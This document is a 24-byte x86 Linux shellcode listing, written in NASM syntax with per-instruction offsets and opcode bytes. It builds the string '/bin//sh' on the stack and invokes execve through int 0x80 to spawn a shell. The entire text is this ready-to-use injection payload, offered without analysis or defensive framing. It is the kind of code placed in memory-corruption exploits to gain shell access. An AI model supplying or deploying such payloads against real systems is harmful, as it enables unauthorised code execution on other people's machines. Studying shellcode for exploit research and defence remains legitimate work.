; total: 24 bytes

bits 32

_start:
    xor eax, eax            ; 0x00000000   2           31c0
    cdq                     ; 0x00000002   1             99
    push eax                ; 0x00000003   1             50
    push 0x68732f2f         ; 0x00000004   5     682f2f7368  ; //sh
    push 0x6e69622f         ; 0x00000009   5     682f62696e  ; /bin
    mov ebx, esp            ; 0x0000000e   2           89e3
    push eax                ; 0x00000010   1             50
    push ebx                ; 0x00000011   1             53
    mov ecx, esp            ; 0x00000012   2           89e1
    mov al, 0xb             ; 0x00000014   2           b00b  ; __NR_execve
    int 0x80                ; 0x00000016   2           cd80